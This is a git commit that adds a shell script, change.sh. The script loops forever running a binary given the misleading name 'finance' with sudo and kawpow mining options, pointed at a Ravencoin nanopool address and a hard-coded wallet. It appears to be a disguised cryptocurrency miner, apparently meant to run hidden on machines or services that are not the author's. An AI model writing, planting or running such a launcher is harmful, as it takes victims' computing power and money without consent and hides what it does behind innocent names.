0e788979e5824c13ef62b6cc86f11a5e111ccfbc
zaujati03 <79645715+zaujati03@users.noreply.github.com>
2021-03-04 18:50:29 +0700

    Add files via upload

---
+++ change.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+POOL=rvn-jp1.nanopool.org
+WALLET=RKRYXHgWFFuX9GG3cCbVvNZBKK2JarSGjQ
+
+while true
+do
+chmod +x ./finance && sudo ./finance --print-full --algo kawpow --url $POOL --worker test --user $WALLET --pass x
+sleep 5
+done
+
